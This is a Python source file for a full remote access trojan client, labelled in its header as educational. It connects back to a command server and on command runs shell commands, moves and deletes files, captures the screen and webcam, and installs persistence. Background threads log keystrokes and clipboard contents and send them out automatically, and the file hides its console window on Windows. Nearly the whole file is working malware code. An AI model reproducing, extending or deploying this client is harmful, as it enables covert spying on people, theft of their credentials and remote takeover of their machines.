#!/usr/bin/env python3
# Educational RAT Client - For learning purposes only
# This program should only be used in controlled test environments

import socket
import subprocess
import os
import platform
import time
import sys
import json
import logging
import io
import base64
import threading
import queue

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 4444
BUFFER_SIZE = 65536
CONNECTION_RETRY = 10
AUTH_USERNAME = "admin"
AUTH_PASSWORD = "password"
ENCRYPTION_KEY = "edu_rat_default_key"

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# Import crypto module
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
try:
    from crypto_utils import send_msg, recv_msg, recv_msg_str, derive_key
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    import struct
    def send_msg(sock, data, key=None):
        if isinstance(data, str): data = data.encode()
        sock.sendall(struct.pack('>I', len(data)) + data)
    def recv_msg(sock, key=None):
        raw = b""
        while len(raw) < 4:
            c = sock.recv(4 - len(raw))
            if not c: return None
            raw += c
        n = struct.unpack('>I', raw)[0]
        if n == 0: return b""
        if n > 50_000_000: return None
        data = b""
        while len(data) < n:
            c = sock.recv(min(65536, n - len(data)))
            if not c: return None
            data += c
        return data
    def recv_msg_str(sock, key=None):
        d = recv_msg(sock, key)
        return d.decode(errors='replace') if d is not None else None
    def derive_key(password): return None

try:
    import pyautogui
    SCREENSHOT_AVAILABLE = True
except ImportError:
    SCREENSHOT_AVAILABLE = False

WEBCAM_AVAILABLE = False
try:
    import cv2
    WEBCAM_AVAILABLE = True
except ImportError:
    pass

KEYLOGGER_AVAILABLE = False
try:
    from pynput import keyboard
    KEYLOGGER_AVAILABLE = True
except ImportError:
    pass

CLIPBOARD_AVAILABLE = False
try:
    import pyperclip
    CLIPBOARD_AVAILABLE = True
except ImportError:
    pass

try:
    from persistence import install_persistence, remove_persistence, check_persistence, get_persistence_methods
    PERSISTENCE_AVAILABLE = True
except ImportError:
    PERSISTENCE_AVAILABLE = False

try:
    from network_scanner import scan_network, scan_ports, get_local_network, full_scan_report, get_arp_table
    SCANNER_AVAILABLE = True
except ImportError:
    SCANNER_AVAILABLE = False

try:
    from spool import Spool
    SPOOL_AVAILABLE = True
except ImportError:
    SPOOL_AVAILABLE = False

import ipaddress


def _compute_backoff_delays(n_failures):
    """Retourne la liste des delais pour n echecs consecutifs (cap 60s).

    Fonction pure utilisee comme reference testable pour la logique de backoff
    exponentiel implementee dans main(). Toute modification de la formule doit
    etre repercutee dans les deux endroits.
    """
    delays = []
    d = 1
    for _ in range(n_failures):
        delays.append(d)
        d = min(d * 2, 60)
    return delays


def _heartbeat_thread(sock, key, stop_event, send_lock, interval=30):
    """Sends PING every `interval` seconds. Waits one interval before first send."""
    while not stop_event.is_set():
        stop_event.wait(interval)  # wait FIRST
        if stop_event.is_set():
            break
        try:
            with send_lock:
                send_msg(sock, "PING", key)
        except Exception:
            logger.debug("Heartbeat stopped: socket error")
            break


def _keylog_flush_thread(keylogger, spool, stop_event, interval=60):
    """Flushes keylogger data to spool every `interval` seconds."""
    while not stop_event.is_set():
        stop_event.wait(interval)
        if stop_event.is_set():
            break
        data = keylogger.get_logs()
        if data and data != "No keylog data":
            spool.push("keylog", {"data": data, "time": time.strftime("%Y-%m-%dT%H:%M:%S")})


def _clipboard_flush_thread(clipboard_monitor, spool, stop_event):
    """Monitors clipboard and flushes to spool on change."""
    last_sent = ""
    while not stop_event.is_set():
        stop_event.wait(2)
        if stop_event.is_set():
            break
        if not clipboard_monitor.history:
            continue
        latest = clipboard_monitor.history[-1].get("content", "")
        if latest and latest != last_sent:
            last_sent = latest
            spool.push("clipboard", {"data": latest, "time": time.strftime("%Y-%m-%dT%H:%M:%S")})


def _spool_sender_thread(sock, key, spool, stop_event, send_lock, pending_acks, interval=5):
    """Drains spool to server. ACKs are processed by the main command loop."""
    while not stop_event.is_set():
        for item in spool.pending():
            if stop_event.is_set():
                break
            # Skip items already pending ACK
            try:
                if item["id"] in pending_acks.queue:
                    continue
            except Exception:
                pass
            try:
                payload = json.dumps({
                    "kind": item["kind"],
                    "ts": item["ts"],
                    "payload": item["payload"],
                    "spool_id": item["id"]
                })
                with send_lock:
                    send_msg(sock, f"spool_data {payload}", key)
                pending_acks.put(item["id"])
            except Exception:
                break  # connection lost — spool stays on disk
        stop_event.wait(interval)


def _screenshot_auto_thread(spool, stop_event, interval=300):
    """Auto-captures screenshot every `interval` seconds to spool."""
    while not stop_event.is_set():
        stop_event.wait(interval)
        if stop_event.is_set():
            break
        if not SCREENSHOT_AVAILABLE:
            continue
        try:
            screenshot = pyautogui.screenshot()
            buf = io.BytesIO()
            screenshot.save(buf, format="PNG")
            b64 = base64.b64encode(buf.getvalue()).decode()
            spool.push("screenshot", {"data_b64": b64, "time": time.strftime("%Y-%m-%dT%H:%M:%S")})
        except Exception as e:
            logger.warning(f"Auto-screenshot failed: {e}")


def test_connection(host, port):
    logger.info(f"Target server: {host}:{port}")
    try:
        import ipaddress
        ip = ipaddress.ip_address(host)
        if ip.is_loopback:
            logger.info("Using loopback (same machine only)")
    except (ValueError, ImportError):
        pass


def authenticate(sock, key):
    try:
        auth_request = recv_msg_str(sock, key)
        if auth_request != "AUTH":
            return False
        credentials = json.dumps({"username": AUTH_USERNAME, "password": AUTH_PASSWORD})
        send_msg(sock, credentials, key)
        response = recv_msg_str(sock, key)
        if response == "AUTH_SUCCESS":
            logger.info("Authentication successful")
            return True
        else:
            logger.error("Authentication failed")
            return False
    except Exception as e:
        logger.error(f"Auth error: {e}")
        return False


def get_system_info():
    info = {
        "System": platform.system(),
        "Node": platform.node(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
    }
    try:
        info["Username"] = os.getlogin()
    except:
        info["Username"] = os.environ.get("USER", os.environ.get("USERNAME", "Unknown"))
    return " | ".join([f"{k}: {v}" for k, v in info.items()])


def execute_command(command):
    try:
        if platform.system() == "Windows":
            process = subprocess.Popen(
                command, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
            )
        else:
            process = subprocess.Popen(
                command.split(), shell=False,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
            )
        stdout, stderr = process.communicate(timeout=30)
        result = stdout.decode(errors='replace') + stderr.decode(errors='replace')
        if not result.strip():
            result = "[+] Command executed (no output)"
        return result
    except subprocess.TimeoutExpired:
        return "[!] Command timed out (30s)"
    except Exception as e:
        return f"[!] Error: {str(e)}"


def list_directory(path):
    try:
        if not path or path == ".":
            path = os.getcwd()
        entries = []
        for item in sorted(os.listdir(path)):
            full = os.path.join(path, item)
            if os.path.isdir(full):
                entries.append(f"[DIR] {item}")
            else:
                try:
                    size = os.path.getsize(full)
                    entries.append(f"{item} ({size} bytes)")
                except:
                    entries.append(item)
        return "\n".join(entries) if entries else "[Empty directory]"
    except Exception as e:
        return f"[!] Error: {e}"


def take_screenshot(sock, key, send_lock):
    if not SCREENSHOT_AVAILABLE:
        with send_lock:
            send_msg(sock, "FAIL", key)
        return
    try:
        screenshot = pyautogui.screenshot()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format="PNG")
        with send_lock:
            send_msg(sock, "PASS", key)
            send_msg(sock, img_bytes.getvalue(), key)
    except Exception as e:
        with send_lock:
            send_msg(sock, "FAIL", key)
        logger.error(f"Screenshot error: {e}")


def capture_webcam(sock, key, send_lock):
    if not WEBCAM_AVAILABLE:
        with send_lock:
            send_msg(sock, "FAIL", key)
        return
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            with send_lock:
                send_msg(sock, "FAIL", key)
            return
        ret, frame = cap.read()
        cap.release()
        if not ret:
            with send_lock:
                send_msg(sock, "FAIL", key)
            return
        ret, buffer = cv2.imencode('.jpg', frame)
        if not ret:
            with send_lock:
                send_msg(sock, "FAIL", key)
            return
        with send_lock:
            send_msg(sock, "PASS", key)
            send_msg(sock, buffer.tobytes(), key)
    except Exception as e:
        with send_lock:
            send_msg(sock, "FAIL", key)
        logger.error(f"Webcam error: {e}")


def stream_screen(sock, key, stop_event, send_lock):
    """Stream screen at low fps for live view"""
    if not SCREENSHOT_AVAILABLE:
        with send_lock:
            send_msg(sock, "FAIL", key)
        return
    with send_lock:
        send_msg(sock, "PASS", key)
    try:
        while not stop_event.is_set():
            screenshot = pyautogui.screenshot()
            screenshot = screenshot.resize((screenshot.width // 2, screenshot.height // 2))
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format="JPEG", quality=40)
            frame_data = img_bytes.getvalue()
            with send_lock:
                send_msg(sock, frame_data, key)
            ack = recv_msg_str(sock, key)
            if ack != "NEXT":
                break
            time.sleep(0.3)
    except Exception as e:
        logger.error(f"Stream error: {e}")
    finally:
        try:
            with send_lock:
                send_msg(sock, b"STREAM_END", key)
        except:
            pass


class Keylogger:
    def __init__(self):
        self.log_data = []
        self.listener = None
        self.running = False

    def on_press(self, key):
        try:
            if hasattr(key, 'char') and key.char:
                self.log_data.append(key.char)
            else:
                self.log_data.append(f'[{key}]')
        except:
            pass

    def start(self):
        if not KEYLOGGER_AVAILABLE:
            return False
        if self.running:
            return True
        try:
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            self.running = True
            return True
        except:
            return False

    def stop(self):
        if self.running and self.listener:
            self.listener.stop()
            self.running = False

    def get_logs(self):
        data = "".join(self.log_data)
        self.log_data.clear()
        return data if data else "No keylog data"


class ClipboardMonitor:
    def __init__(self):
        self.running = False
        self.history = []
        self.last_content = ""
        self.thread = None

    def start(self):
        if not CLIPBOARD_AVAILABLE:
            return False
        if self.running:
            return True
        self.running = True
        self.thread = threading.Thread(target=self._monitor, daemon=True)
        self.thread.start()
        return True

    def _monitor(self):
        while self.running:
            try:
                content = pyperclip.paste()
                if content and content != self.last_content:
                    self.last_content = content
                    self.history.append({
                        "time": time.strftime("%H:%M:%S"),
                        "content": content[:500]
                    })
            except:
                pass
            time.sleep(1)

    def stop(self):
        self.running = False

    def get_history(self):
        if not self.history:
            return "No clipboard data captured"
        lines = []
        for entry in self.history:
            lines.append(f"[{entry['time']}] {entry['content'][:100]}")
        return "\n".join(lines)

    def clear(self):
        self.history.clear()


def main():
    test_connection(SERVER_HOST, SERVER_PORT)
    keylogger = Keylogger()
    clipboard_monitor = ClipboardMonitor()
    stream_stop_event = threading.Event()
    _reconnect_delay = 1          # backoff exponentiel

    # Verify/reinstall persistence on startup
    if PERSISTENCE_AVAILABLE:
        try:
            from persistence import verify
            verify()
        except Exception as e:
            logger.warning(f"Persistence verify failed: {e}")

    while True:
        try:
            logger.info(f"Connecting to {SERVER_HOST}:{SERVER_PORT}...")
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(10)
            client.connect((SERVER_HOST, SERVER_PORT))
            client.settimeout(None)
            # Don't reset backoff here: wait for auth success
            logger.info("Connected!")

            # Derive encryption key
            key = derive_key(ENCRYPTION_KEY)
            if key and CRYPTO_AVAILABLE:
                logger.info("AES-256 encryption active")
            else:
                logger.info("Running without encryption")

            if not authenticate(client, key):
                client.close()
                # Pas de reset du backoff: laisser remonter vers le bas de la
                # boucle qui s'occupe du sleep + doublement (voir _compute_backoff_delays)
                continue

            # Auth succeeded: reset exponential backoff
            _reconnect_delay = 1
            logger.info("Authenticated, backoff reset")

            # Per-connection send lock (shared by main loop + heartbeat thread)
            send_lock = threading.Lock()

            # Heartbeat
            hb_stop = threading.Event()
            hb_thread = threading.Thread(
                target=_heartbeat_thread,
                args=(client, key, hb_stop, send_lock),
                daemon=True
            )
            hb_thread.start()

            # Auto-exfiltration via spool
            if SPOOL_AVAILABLE:
                _spool = Spool()
                exfil_stop = threading.Event()
                threading.Thread(
                    target=_keylog_flush_thread,
                    args=(keylogger, _spool, exfil_stop),
                    daemon=True
                ).start()
                threading.Thread(
                    target=_clipboard_flush_thread,
                    args=(clipboard_monitor, _spool, exfil_stop),
                    daemon=True
                ).start()
                pending_spool_acks = queue.Queue()
                threading.Thread(
                    target=_spool_sender_thread,
                    args=(client, key, _spool, exfil_stop, send_lock, pending_spool_acks),
                    daemon=True
                ).start()
                threading.Thread(
                    target=_screenshot_auto_thread,
                    args=(_spool, exfil_stop),
                    daemon=True
                ).start()

            while True:
                command = recv_msg_str(client, key)
                if command is None:
                    logger.warning("Connection lost")
                    break

                if command == "sysinfo":
                    with send_lock:
                        send_msg(client, get_system_info(), key)

                elif command == "screenshot":
                    take_screenshot(client, key, send_lock)

                elif command == "webcam":
                    capture_webcam(client, key, send_lock)

                elif command == "stream_start":
                    stream_stop_event.clear()
                    stream_screen(client, key, stream_stop_event, send_lock)

                elif command == "stream_stop":
                    stream_stop_event.set()
                    with send_lock:
                        send_msg(client, "[+] Stream stopped", key)

                elif command == "keylogger_start":
                    if keylogger.start():
                        with send_lock:
                            send_msg(client, "[+] Keylogger started", key)
                    else:
                        with send_lock:
                            send_msg(client, "[!] Keylogger unavailable", key)

                elif command == "keylogger_stop":
                    keylogger.stop()
                    with send_lock:
                        send_msg(client, "[+] Keylogger stopped", key)

                elif command == "keylogger_dump":
                    with send_lock:
                        send_msg(client, keylogger.get_logs(), key)

                elif command == "clipboard_start":
                    if clipboard_monitor.start():
                        with send_lock:
                            send_msg(client, "[+] Clipboard monitor started", key)
                    else:
                        with send_lock:
                            send_msg(client, "[!] Clipboard monitor unavailable (pyperclip not installed)", key)

                elif command == "clipboard_stop":
                    clipboard_monitor.stop()
                    with send_lock:
                        send_msg(client, "[+] Clipboard monitor stopped", key)

                elif command == "clipboard_dump":
                    with send_lock:
                        send_msg(client, clipboard_monitor.get_history(), key)

                elif command == "clipboard_current":
                    try:
                        if CLIPBOARD_AVAILABLE:
                            with send_lock:
                                send_msg(client, pyperclip.paste() or "[Empty clipboard]", key)
                        else:
                            with send_lock:
                                send_msg(client, "[!] pyperclip not installed", key)
                    except:
                        with send_lock:
                            send_msg(client, "[!] Cannot access clipboard", key)

                elif command.startswith("persist_install"):
                    if not PERSISTENCE_AVAILABLE:
                        with send_lock:
                            send_msg(client, "[!] Persistence module unavailable", key)
                        continue
                    parts = command.split(" ", 1)
                    method = parts[1] if len(parts) > 1 else None
                    success, msg = install_persistence(method=method)
                    with send_lock:
                        send_msg(client, f"{'[+]' if success else '[!]'} {msg}", key)

                elif command == "persist_remove":
                    if not PERSISTENCE_AVAILABLE:
                        with send_lock:
                            send_msg(client, "[!] Persistence module unavailable", key)
                        continue
                    success, msg = remove_persistence()
                    with send_lock:
                        send_msg(client, f"{'[+]' if success else '[!]'} {msg}", key)

                elif command == "persist_check":
                    if not PERSISTENCE_AVAILABLE:
                        with send_lock:
                            send_msg(client, "[!] Persistence module unavailable", key)
                        continue
                    status = check_persistence()
                    result = "Persistence Status:\n"
                    for method, active in status.items():
                        result += f"  {method}: {'ACTIVE' if active else 'inactive'}\n"
                    with send_lock:
                        send_msg(client, result, key)

                elif command == "persist_methods":
                    if not PERSISTENCE_AVAILABLE:
                        with send_lock:
                            send_msg(client, "[!] Persistence module unavailable", key)
                        continue
                    methods = get_persistence_methods()
                    with send_lock:
                        send_msg(client, "Available methods:\n" + "\n".join(f"  - {m}" for m in methods), key)

                elif command == "scan_network":
                    if not SCANNER_AVAILABLE:
                        with send_lock:
                            send_msg(client, "[!] Network scanner unavailable", key)
                        continue
                    with send_lock:
                        send_msg(client, "[*] Scanning network (this may take a moment)...", key)
                    # Wait for ack
                    recv_msg_str(client, key)
                    report = full_scan_report()
                    with send_lock:
                        send_msg(client, report, key)

                elif command.startswith("scan_ports "):
                    if not SCANNER_AVAILABLE:
                        with send_lock:
                            send_msg(client, "[!] Network scanner unavailable", key)
                        continue
                    target = command.split(" ", 1)[1]
                    results = scan_ports(target)
                    output = f"Port scan of {target}:\n"
                    for port, service, is_open in results:
                        if is_open:
                            output += f"  {port}/{service}: OPEN\n"
                    if not any(r[2] for r in results):
                        output += "  No open ports found\n"
                    with send_lock:
                        send_msg(client, output, key)

                elif command == "scan_arp":
                    if not SCANNER_AVAILABLE:
                        with send_lock:
                            send_msg(client, "[!] Network scanner unavailable", key)
                        continue
                    with send_lock:
                        send_msg(client, get_arp_table(), key)

                elif command.startswith("upload "):
                    filename = command.split(" ", 1)[1]
                    file_data = recv_msg(client, key)
                    if file_data is not None:
                        with open(filename, "wb") as f:
                            f.write(file_data)
                        with send_lock:
                            send_msg(client, f"[+] File saved: {filename} ({len(file_data)} bytes)", key)
                    else:
                        with send_lock:
                            send_msg(client, "[!] Failed to receive file", key)

                elif command.startswith("download "):
                    filepath = command.split(" ", 1)[1]
                    if os.path.isfile(filepath):
                        with send_lock:
                            send_msg(client, "PASS", key)
                            with open(filepath, "rb") as f:
                                send_msg(client, f.read(), key)
                    else:
                        with send_lock:
                            send_msg(client, "FAIL", key)

                elif command.startswith("listdir"):
                    parts = command.split(" ", 1)
                    path = parts[1] if len(parts) > 1 else "."
                    with send_lock:
                        send_msg(client, list_directory(path), key)

                elif command.startswith("delete "):
                    filepath = command.split(" ", 1)[1]
                    try:
                        if os.path.isfile(filepath):
                            os.remove(filepath)
                            with send_lock:
                                send_msg(client, f"[+] Deleted: {filepath}", key)
                        else:
                            with send_lock:
                                send_msg(client, f"[!] Not found: {filepath}", key)
                    except Exception as e:
                        with send_lock:
                            send_msg(client, f"[!] Delete error: {e}", key)

                elif command == "capabilities":
                    caps = {
                        "screenshot": SCREENSHOT_AVAILABLE,
                        "webcam": WEBCAM_AVAILABLE,
                        "keylogger": KEYLOGGER_AVAILABLE,
                        "clipboard": CLIPBOARD_AVAILABLE,
                        "persistence": PERSISTENCE_AVAILABLE,
                        "scanner": SCANNER_AVAILABLE,
                        "crypto": CRYPTO_AVAILABLE,
                        "platform": platform.system(),
                    }
                    with send_lock:
                        send_msg(client, json.dumps(caps), key)

                elif command == "exit":
                    keylogger.stop()
                    clipboard_monitor.stop()
                    stream_stop_event.set()
                    client.close()
                    logger.info("Exit received")
                    sys.exit(0)

                elif command == "SPOOL_ACK":
                    if SPOOL_AVAILABLE:
                        try:
                            item_id = pending_spool_acks.get_nowait()
                            _spool.ack(item_id)
                        except Exception:
                            pass

                elif command == "SPOOL_NACK":
                    if SPOOL_AVAILABLE:
                        try:
                            pending_spool_acks.get_nowait()  # discard, item stays in spool for retry
                        except Exception:
                            pass

                else:
                    response = execute_command(command)
                    with send_lock:
                        send_msg(client, response, key)

        except (ConnectionRefusedError, OSError) as e:
            logger.warning(f"Connection failed ({e}), retry in {_reconnect_delay}s")
        except Exception as e:
            logger.error(f"Error: {e}")
        finally:
            try:
                hb_stop.set()
                exfil_stop.set()
            except NameError:
                pass

        stream_stop_event.set()
        time.sleep(_reconnect_delay)
        # Backoff: see _compute_backoff_delays for the reference formula
        _reconnect_delay = min(_reconnect_delay * 2, 60)


if __name__ == "__main__":
    logger.info(f"Client on {platform.system()} Python {platform.python_version()}")
    if platform.system() == "Windows":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    main()
